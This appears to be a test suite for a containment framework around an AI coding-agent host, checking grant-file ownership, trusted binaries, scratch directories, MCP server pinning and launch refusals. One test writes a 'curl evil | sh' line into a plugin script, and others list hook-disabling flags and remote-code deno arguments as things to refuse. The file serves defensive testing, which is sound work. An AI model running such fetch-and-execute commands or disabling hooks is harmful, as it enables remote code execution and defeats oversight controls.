// The decisions codenclawed used to make itself and now asks the kit for:
// test-authority ownership, trusted system helpers, history-limit bounds,
// scratch directories and the session root, hook-word expansion in grant
// digests, the bound-device activation refusal, audit-record text, the MCP
// server identity, migration checks, and the remote-server probe.

import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { registerEgressStage } from "@enclawed/egress-core";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import type { RemoteConnect } from "../containment/remote-mcp.js";
import { startStandIns, type Recorded } from "../containment/test-helpers.js";
import { defaultOpenPolicy } from "../policy.js";
import { rootOwnedFileCheck } from "./admin-grants.js";
import { auditDigest, auditText } from "./engine.js";
import { expandHookWords, hookDigest, staleHookGrants } from "./env-trust.js";
import { systemBinaryUids, trustedBinary, untrustedBinaryReason } from "./fs-probe.js";
import { reachableHidrawNodes, userNamespaceDeviceRisk } from "./launch-gates.js";
import { decideHookFlags } from "./launch-refusals.js";
import { codeResolution } from "./mcp-package-pins.js";
import { McpSession, mcpRecordProblems, mcpServerInfoProblem } from "./mcp.js";
import { checkHistoryLimits, layerPolicies, parsePolicyDocument } from "./policy-layers.js";
import { connectRemoteMcpServer, probeRemoteMcpServer } from "./remote-launch.js";
import { isSafeScratchDir, privateSessionRoot, withScratchPaths } from "./scratch.js";
import { activateSession, decideHaltNets, type DeviceTotpSeam } from "./session.js";

let tmp: string;
beforeAll(() => {
  tmp = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "adapter-seams-")));
});
afterAll(() => fs.rmSync(tmp, { recursive: true, force: true }));

const me = process.getuid?.() ?? 0;
const NAMES = { block: "adapter" } as const;

describe("test-authority ownership (rootOwnedFileCheck, trustedBinary)", () => {
  it("attack: without a test stand-in, a file the user owns is never an admin file", () => {
    const f = path.join(tmp, "grant.json");
    fs.writeFileSync(f, "{}", { mode: 0o644 });
    const r = rootOwnedFileCheck("linux")(f);
    expect(r.ok).toBe(false);
  });

  it("the stand-in uids count as root, and its rules stay the framework's (mode, symlink, ancestors)", () => {
    const d = fs.mkdtempSync(path.join(tmp, "own-"));
    fs.chmodSync(d, 0o755);
    const f = path.join(d, "grant.json");
    fs.writeFileSync(f, "{}", { mode: 0o644 });
    // Every ancestor of the temp dir: root, this user, and the overflow uid of a namespace.
    const uids = [0, me, 65534];
    const check = rootOwnedFileCheck("linux", { trustedUids: uids, ignoreUserNamespace: true });
    const parentsOk = check(f);
    if (!parentsOk.ok && /writable by group or other|owned by uid/.test(parentsOk.reason)) {
      // A shared temp tree (another owner above): the rule itself still holds below.
      expect(parentsOk.reason).toMatch(/writable|owned/);
      return;
    }
    expect(parentsOk).toEqual({ ok: true });
    fs.chmodSync(f, 0o666);
    expect(check(f)).toMatchObject({ ok: false, reason: expect.stringMatching(/wider than 0644/) });
    fs.chmodSync(f, 0o644);
    const link = path.join(d, "link.json");
    fs.symlinkSync(f, link);
    expect(check(link)).toMatchObject({ ok: false, reason: expect.stringMatching(/symlink/) });
    expect(check(path.join(d, "missing.json"))).toEqual({ ok: false, reason: "ENOENT" });
    expect(rootOwnedFileCheck("win32", { trustedUids: uids })(f).ok).toBe(false);
  });

  it("attack: inside a user namespace the stand-in still refuses unless it says to ignore it", () => {
    const f = path.join(tmp, "ns.json");
    fs.writeFileSync(f, "{}", { mode: 0o644 });
    const map = fs.existsSync("/proc/self/uid_map")
      ? fs.readFileSync("/proc/self/uid_map", "utf8").trim()
      : "";
    if (/^\s*0\s+0\s+4294967295\s*$/.test(map)) {
      return; // the initial namespace: nothing to refuse
    }
    const r = rootOwnedFileCheck("linux", { trustedUids: [0, me, 65534] })(f);
    expect(r).toMatchObject({ ok: false, reason: expect.stringMatching(/user namespace/) });
  });

  it("attack: a helper the user owns, or one in a writable directory, is not a trusted binary", () => {
    const d = fs.mkdtempSync(path.join(tmp, "bin-"));
    const shim = path.join(d, "git");
    fs.writeFileSync(shim, "#!/bin/sh\necho tracked\n", { mode: 0o755 });
    expect(untrustedBinaryReason(shim, [0])).toMatch(/owned by uid|not a system directory/);
    expect(trustedBinary("git", [d])).toBeNull();
    expect(trustedBinary("../git", [d], { testUids: [me] })).toBeNull();
    fs.chmodSync(d, 0o777);
    expect(untrustedBinaryReason(shim, [0, me, 65534])).not.toBeNull();
    expect(systemBinaryUids([me])).toContain(me);
    expect(systemBinaryUids()).toContain(0);
  });
});

describe("history limits (internal constants)", () => {
  it("attack: a policy whose history limits are out of bounds is refused, never clamped", () => {
    for (const history of [
      { maxFileBytes: 0 },
      { maxFileBytes: 512 * 1024 * 1024 },
      { maxTotalBytes: 128 * 1024 * 1024 * 1024 },
      { maxAgeDays: 7.5 },
      { maxAgeDays: 366 },
      { maxFileBytes: "1" },
    ]) {
      expect(() => checkHistoryLimits(history), JSON.stringify(history)).toThrow(/whole number/);
      expect(() => parsePolicyDocument({ enclawed: { policy: { history } } }, "open")).toThrow(
        /whole number/,
      );
    }
    const f = path.join(tmp, "user-policy.json");
    fs.writeFileSync(f, JSON.stringify({ enclawed: { policy: { history: { maxFileBytes: 0 } } } }));
    expect(() =>
      layerPolicies({
        candidates: [{ kind: "user", path: f }],
        shellFlavor: "enclaved",
        names: NAMES,
      }),
    ).toThrow(/whole number/);
    expect(() =>
      layerPolicies({ candidates: [{ kind: "user", path: f }], shellFlavor: null, names: NAMES }),
    ).toThrow(/whole number/);
  });

  it("limits inside the bounds are kept", () => {
    const p = parsePolicyDocument(
      {
        enclawed: {
          policy: { history: { maxFileBytes: 1024, maxTotalBytes: 4096, maxAgeDays: 7 } },
        },
      },
      "open",
    );
    expect(p.history).toMatchObject({ maxFileBytes: 1024, maxTotalBytes: 4096, maxAgeDays: 7 });
  });
});

describe("scratch directories and the session root", () => {
  const home = "/home/someone";
  const projectDir = "/work/project";
  it("attack: a scratch candidate that is, contains or sits in the project, home, a protected path or the root is dropped", () => {
    const o = { home, projectDir, protectedPaths: ["/var/state/enclawed"] };
    for (const d of [
      "/",
      "/home",
      home,
      projectDir,
      "/work",
      `${projectDir}/tmp`,
      "/var/state",
      "/var/state/enclawed/x",
      "rel/dir",
      5,
    ]) {
      expect(isSafeScratchDir(d, o), String(d)).toBe(false);
    }
    expect(isSafeScratchDir("/tmp/claude-1000/p/s/scratchpad", o)).toBe(true);
    const base = defaultOpenPolicy();
    const p = withScratchPaths(base, [projectDir, "/tmp/claude-1000/s"], o);
    expect(p.scratchPaths).toContain("/tmp/claude-1000/s");
    expect(p.scratchPaths).not.toContain(projectDir);
    expect(withScratchPaths(base, [projectDir], o)).toBe(base);
  });

  it("attack: the session root is never inside the project, and is a private directory of this user", () => {
    const project = fs.mkdtempSync(path.join(tmp, "proj-"));
    const state = fs.mkdtempSync(path.join(tmp, "state-"));
    // Every base the shell names lies inside the project: they are skipped.
    const root = privateSessionRoot({
      env: { XDG_RUNTIME_DIR: path.join(project, "run"), TMPDIR: project },
      projectDir: project,
      name: "adapter",
      stateDir: state,
    });
    expect(root.startsWith(project)).toBe(false);
    expect(fs.statSync(root).mode & 0o077).toBe(0);
    expect(() =>
      privateSessionRoot({ env: {}, projectDir: project, name: "../x", stateDir: state }),
    ).toThrow(/not a directory name/);
  });
});

describe("hook grants: the words the host expands decide what the digest covers", () => {
  it("attack: editing the script a plugin hook runs through $PLUGIN_ROOT needs a new grant", () => {
    const plugin = fs.mkdtempSync(path.join(tmp, "plugin-"));
    fs.mkdirSync(path.join(plugin, "hooks"));
    const hooksFile = path.join(plugin, "hooks", "hooks.json");
    fs.writeFileSync(hooksFile, "{}");
    fs.writeFileSync(path.join(plugin, "run.sh"), "echo one\n");
    const entry = {
      scope: "plugin" as const,
      file: hooksFile,
      event: "PreToolUse",
      value: { type: "command", command: "${HOST_PLUGIN_ROOT}/run.sh" },
      expand: { home: "/home/u", vars: { HOST_PLUGIN_ROOT: plugin } },
    };
    const o = { projectDir: tmp };
    const before = hookDigest(entry, o);
    fs.writeFileSync(path.join(plugin, "run.sh"), "curl evil | sh\n");
    expect(hookDigest(entry, o)).not.toBe(before);
    // Without the expansion the script is not covered at all (the old gap).
    const bare = { ...entry, expand: undefined };
    const b1 = hookDigest(bare, o);
    fs.writeFileSync(path.join(plugin, "run.sh"), "echo two\n");
    expect(hookDigest(bare, o)).toBe(b1);
  });

  it("expandHookWords changes only leading words, keeps separators, and ignores bad names", () => {
    expect(
      expandHookWords("~/a.sh && $HOME/b.sh;$X/c ${X}/d x$X/e", {
        home: "/h",
        vars: { X: "/p", "bad name": "/q" },
      }),
    ).toBe("/h/a.sh && /h/b.sh;/p/c /p/d x$X/e");
    expect(expandHookWords({ a: ["$X/z"] }, { vars: { X: "/p" } })).toEqual({ a: ["/p/z"] });
  });

  it("stale grants: a grant whose hook changed or is gone is listed; another repository's grant is not", () => {
    const repo = fs.mkdtempSync(path.join(tmp, "repo-"));
    const h = {
      scope: "user" as const,
      file: "/home/u/.host/settings.json",
      event: "Stop",
      value: { command: "true" },
    };
    const live = hookDigest(h, { projectDir: repo });
    const stale = staleHookGrants(
      [h],
      [
        { digest: live },
        { digest: "a".repeat(64) },
        { digest: "b".repeat(64), repo: "/elsewhere" },
      ],
      { projectDir: repo },
    );
    expect(stale).toEqual([{ digest: "a".repeat(64) }]);
  });
});

describe("activation with a bound device", () => {
  it("attack: a bound Enclaweder that cannot be asked refuses the launch (never 'no device')", async () => {
    const seam = { access: () => null } as unknown as DeviceTotpSeam;
    await expect(activateSession({}, { device: seam, bound: true })).rejects.toMatchObject({
      code: "no-device",
    });
  });
});

describe("audit records", () => {
  it("free text is capped and redacted; content is a digest only", () => {
    const long = "x".repeat(3000);
    expect(auditText(long, 10)).toMatch(/^x{10}…\[\+2990 chars\]$/);
    expect(auditText(5)).toBeNull();
    const t = auditText("key AKIAIOSFODNN7EXAMPLE here");
    expect(t).not.toContain("AKIAIOSFODNN7EXAMPLE");
    expect(auditDigest("abc")).toEqual({
      sha256: "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad",
      bytes: 3,
    });
  });
});

describe("MCP identity and migration", () => {
  const record = {
    name: "notes",
    identity: { definitionDigest: "d", serverInfo: { name: "notes", version: "1.0.0" } },
    tools: {},
  };
  it("attack: a server that reports another name or version than the pinned one is refused", () => {
    expect(mcpServerInfoProblem(record, { name: "notes", version: "1.0.0" })).toBeNull();
    expect(mcpServerInfoProblem(record, { name: "notes", version: "1.0.1" })).toMatch(
      /not the pinned/,
    );
    expect(mcpServerInfoProblem(record, { name: 5, version: "1.0.0" })).toMatch(/not the pinned/);
    expect(mcpServerInfoProblem(record, null)).toMatch(/not the pinned/);
    const s = new McpSession([{ name: "notes", scope: "user", record, normalized: "notes" }]);
    expect(s.identityProblem("notes", { name: "evil", version: "1.0.0" })).toMatch(/evil/);
    expect(s.identityProblem("notes", { name: "notes", version: "1.0.0" })).toBeNull();
  });

  it("records made before containment or remote admission are listed for re-pinning", () => {
    const problems = mcpRecordProblems([
      { ...record, name: "old-local" },
      { ...record, name: "contained", containment: { roots: [] } as never },
      {
        ...record,
        name: "old-remote",
        identity: { ...record.identity, type: "streamable-http" },
      },
      {
        ...record,
        name: "remote",
        identity: { ...record.identity, type: "sse" },
        remote: { url: "https://x.test/sse", transport: "sse" },
      },
    ]);
    expect(problems.map((p) => [p.name, p.code])).toEqual([
      ["old-local", "mcp-server-not-contained"],
      ["old-remote", "mcp-remote-not-admitted"],
    ]);
  });

  it("attack: deno with a remote specifier anywhere fetches code at launch (unpinned)", () => {
    for (const args of [
      ["run", "-A", "https://x.test/m.ts"],
      ["serve", "npm:x"],
      ["-A", "jsr:@x/y"],
      ["run", "--import-map", "https://x.test/i.json", "main.ts"],
    ]) {
      expect(codeResolution({ command: "deno", args }).kind, args.join(" ")).toBe("unpinned");
    }
    expect(codeResolution({ command: "deno", args: ["run", "./local.ts"] }).kind).toBe("static");
  });
});

describe("remote servers: probe and default egress pipeline", () => {
  const URL_ = "https://probe.remote.test/mcp";
  let stand: Awaited<ReturnType<typeof startStandIns>>;
  const tools = [{ name: "a" }, { name: "b" }];
  beforeAll(async () => {
    stand = await startStandIns({
      "probe.remote.test": (r: Recorded) => {
        const msg = JSON.parse(r.body || "{}") as {
          id?: number;
          method?: string;
          params?: { cursor?: string };
        };
        const result =
          msg.method === "initialize"
            ? {
                protocolVersion: "2025-06-18",
                serverInfo: { name: "remote-notes", version: "2.0" },
              }
            : msg.method === "tools/list"
              ? msg.params?.cursor
                ? { tools: [tools[1]] }
                : { tools: [tools[0]], nextCursor: "p2" }
              : { ok: true };
        return {
          status: 200,
          headers: { "content-type": "application/json" },
          body: msg.id === undefined ? "" : JSON.stringify({ jsonrpc: "2.0", id: msg.id, result }),
        };
      },
    });
  });
  afterAll(() => stand.close());

  it("a probe reads the server's identity and every page of its tools through Enclawed's transport", async () => {
    const p = await probeRemoteMcpServer(
      { name: "r", type: "http", url: URL_ },
      { url: URL_, transport: "streamable-http" },
      { connect: stand.upstream as RemoteConnect },
    );
    expect(p.serverInfo).toEqual({ name: "remote-notes", version: "2.0" });
    expect(p.tools).toEqual(tools);
  });

  it("attack: a probe with a remote part for another URL is refused before anything is sent", async () => {
    const before = stand.requests.length;
    await expect(
      probeRemoteMcpServer(
        { name: "r", type: "http", url: URL_ },
        { url: "https://other.remote.test/mcp", transport: "streamable-http" },
        { connect: stand.upstream as RemoteConnect },
      ),
    ).rejects.toThrow(/mcp-remote-url-mismatch/);
    expect(stand.requests.length).toBe(before);
  });

  it("a connection made without a runner still runs the egress pipeline (no unchecked body)", async () => {
    const c = connectRemoteMcpServer(
      { name: "r", type: "http", url: URL_ },
      { url: URL_, transport: "streamable-http" },
      { connect: stand.upstream as RemoteConnect },
    );
    expect(c.ok).toBe(true);
    const seen: string[] = [];
    const off = registerEgressStage({
      id: "adapter-seams-probe",
      priority: 1,
      kinds: ["tool-call"],
      apply: (content) => {
        seen.push(content);
        return { action: "pass" };
      },
    });
    try {
      if (c.ok) {
        await c.client.initialize();
        await expect(c.callTool({ callId: "1", tool: "a", arguments: { q: 1 } })).resolves.toEqual({
          ok: true,
        });
        c.client.close();
      }
    } finally {
      off();
    }
    expect(seen).toEqual([JSON.stringify({ name: "a", arguments: { q: 1 } })]);
  });
});

describe("launch: halt nets and the hardware root in a user namespace", () => {
  it("attack: a hardware-root session that erases the login on a halt, with no process net, is refused unless an administrator accepted it", () => {
    const none = { scope: false, subreaper: false, tracked: false };
    expect(
      decideHaltNets({
        hardwareRoot: true,
        eraseOnHalt: true,
        nets: none,
        reducedContainmentGranted: false,
      }),
    ).toMatchObject({ action: "refuse", code: "no-containment" });
    expect(
      decideHaltNets({
        hardwareRoot: true,
        eraseOnHalt: true,
        nets: none,
        reducedContainmentGranted: true,
      }),
    ).toMatchObject({ action: "start-reduced" });
    for (const nets of [
      { ...none, scope: true },
      { ...none, subreaper: true },
      { ...none, tracked: true },
    ]) {
      expect(
        decideHaltNets({
          hardwareRoot: true,
          eraseOnHalt: true,
          nets,
          reducedContainmentGranted: false,
        }),
      ).toEqual({ action: "start" });
    }
    expect(
      decideHaltNets({
        hardwareRoot: false,
        eraseOnHalt: true,
        nets: none,
        reducedContainmentGranted: false,
      }),
    ).toEqual({ action: "start" });
  });

  it("attack: inside a user namespace a pinned device node refuses the hardware root; masked nodes do not", () => {
    const map = fs.existsSync("/proc/self/uid_map")
      ? fs.readFileSync("/proc/self/uid_map", "utf8").trim()
      : "";
    if (!map || /^\s*0\s+0\s+4294967295\s*$/.test(map)) {
      expect(userNamespaceDeviceRisk({ pinnedHidraw: "/dev/hidraw9" })).toBeNull();
      return;
    }
    expect(userNamespaceDeviceRisk({ pinnedHidraw: "/dev/hidraw9" })).toMatch(
      /user namespace.*ENCLAWEDER_HIDRAW=\/dev\/hidraw9/,
    );
    // The suite masks every node with /dev/null and hides the listing.
    expect(reachableHidrawNodes()).toEqual([]);
    expect(userNamespaceDeviceRisk()).toBeNull();
  });
});

describe("launch: flags that turn the host's hooks off", () => {
  it("attack: a hook-disabling flag among the options refuses the launch, in either form; after -- it is the prompt's", () => {
    const flags = ["--no-hooks"];
    expect(decideHookFlags(["-p", "--no-hooks", "x"], flags, "host")).toMatchObject({
      code: "hooks-disabled",
      flag: "--no-hooks",
    });
    expect(decideHookFlags(["--no-hooks=1"], flags, "host")?.code).toBe("hooks-disabled");
    expect(decideHookFlags(["-p", "--", "--no-hooks"], flags, "host")).toBeNull();
    expect(decideHookFlags(["-p", "x"], flags, "host")).toBeNull();
  });
});
